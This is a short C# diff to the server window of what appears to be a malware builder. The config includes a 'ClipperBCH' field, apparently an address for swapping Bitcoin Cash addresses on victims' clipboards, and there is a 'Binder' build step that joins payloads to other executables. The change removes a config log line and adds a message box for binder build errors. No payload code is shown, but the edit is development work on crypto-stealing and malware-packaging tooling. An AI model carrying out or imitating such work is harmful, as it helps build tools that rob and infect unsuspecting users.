@@ -2952,8 +2952,6 @@ public partial class ServerWindow : ThemedWindow
                 ["ClipperBCH"]  = ClipperBCH.Text.Trim(),
             };
             File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
-            Log($"[+] Config saved to {path}");
-
         }
         catch (Exception ex) { Log($"[!] Failed to save config: {ex.Message}"); }
     }
@@ -5763,9 +5761,15 @@ Read-Host 'Press Enter to close'
             msg => Dispatcher.BeginInvoke(() => TxtBinderStatus.Text = msg));
 
         BtnBinderBuild.IsEnabled = true;
-        TxtBinderStatus.Text = result == "OK"
-            ? $"✓ Built → {Path.GetFileName(output)}"
-            : result;
+        if (result == "OK")
+        {
+            TxtBinderStatus.Text = $"✓ Built → {Path.GetFileName(output)}";
+        }
+        else
+        {
+            TxtBinderStatus.Text = result.Split('\n')[0];
+            System.Windows.MessageBox.Show(result, "Binder — Build Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
+        }
     }
 
     [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
